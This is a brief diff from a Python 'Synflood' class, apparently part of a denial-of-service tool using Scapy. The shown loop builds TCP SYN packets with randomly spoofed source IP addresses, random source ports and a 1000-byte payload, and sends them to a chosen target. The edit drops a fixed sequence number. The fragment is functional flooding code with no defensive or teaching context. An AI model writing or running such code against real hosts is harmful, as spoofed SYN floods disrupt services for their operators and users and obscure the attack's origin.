@@ -23,7 +23,7 @@ class Synflood:
             fake_ip = "%d.%d.%d.%d" % (random.randint(1,254), random.randint(1,254), random.randint(1,254), random.randint(1,254))
             rand_port = random.randint(0, 65535)
             raw = Raw(b"X" * 1000)
-            send(IP(src=fake_ip, dst=self.target) / TCP(sport=rand_port, dport=self.port, seq=1505066, flags="S") / raw, verbose=0)
+            send(IP(src=fake_ip, dst=self.target) / TCP(sport=rand_port, dport=self.port, flags="S") / raw, verbose=0)
         self.event.clear()
         print("Thread finished\n")
 
